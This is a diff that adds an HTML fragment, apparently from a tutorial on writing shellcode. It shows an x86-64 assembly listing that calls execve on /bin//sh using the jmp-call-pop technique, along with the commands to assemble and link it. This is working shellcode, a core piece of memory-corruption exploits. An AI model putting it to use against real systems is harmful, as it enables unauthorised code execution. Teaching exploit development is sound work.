@@ -1,0 +1,23 @@
+I"}
+<hr />
+<div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">➜</span>  <span class="o">~</span>  <span class="nv">cat</span> <span class="nv">shellcode</span><span class="o">.</span><span class="nv">asm</span>
+<span class="nv">section</span> <span class="o">.</span><span class="nv">text</span>
+	<span class="nv">global</span> <span class="nv">_start</span>
+<span class="nv">_start:</span>
+	<span class="nv">jmp</span> <span class="nv">shell</span>
+<span class="nv">here:</span>
+	<span class="nv">xor</span> <span class="nv">rax</span><span class="p">,</span><span class="nv">rax</span>
+	<span class="nb">pop</span> <span class="nv">rdi</span>
+	<span class="nv">xor</span> <span class="nv">rsi</span><span class="p">,</span><span class="nv">rsi</span>
+	<span class="nv">xor</span> <span class="nv">rdx</span><span class="p">,</span><span class="nv">rdx</span>
+	<span class="nv">add</span> <span class="nv">rax</span><span class="p">,</span><span class="mi">59</span>
+	<span class="nb">syscall</span>
+<span class="nv">shell:</span>
+	<span class="nv">call</span> <span class="nv">here</span>
+<span class="nv">bash</span> <span class="nv">db</span> <span class="p">"</span><span class="s2">/bin//sh</span><span class="p">"</span>
+<span class="err">➜</span>  <span class="o">~</span>  <span class="nv">nasm</span> <span class="o">-</span><span class="nv">f</span> <span class="nv">elf64</span> <span class="nv">shellcode</span><span class="o">.</span><span class="nv">asm</span> <span class="o">-</span><span class="nv">o</span> <span class="nv">shellcode</span><span class="o">.</span><span class="nv">o</span>
+<span class="err">➜</span>  <span class="o">~</span>  <span class="nv">ld</span> <span class="nv">shellcode</span><span class="o">.</span><span class="nv">o</span> <span class="o">-</span><span class="nv">o</span> <span class="nv">shellcode</span>
+<span class="err">➜</span>  <span class="o">~</span>  <span class="nv">file</span> <span class="nv">shellcode</span>
+<span class="nv">shellcode:</span> <span class="nv">ELF</span> <span class="mi">64</span><span class="o">-</span><span class="nv">bit</span> <span class="nv">LSB</span> <span class="nv">executable</span><span class="p">,</span> <span class="nv">x86</span><span class="o">-</span><span class="mi">64</span><span class="p">,</span> <span class="nv">version</span> <span class="mi">1</span> <span class="p">(</span><span class="nv">SYSV</span><span class="p">),</span> <span class="nv">statically</span> <span class="nv">linked</span><span class="p">,</span> <span class="ow">not</span> <span class="nv">stripped</span>
+</code></pre></div></div>
+:ET
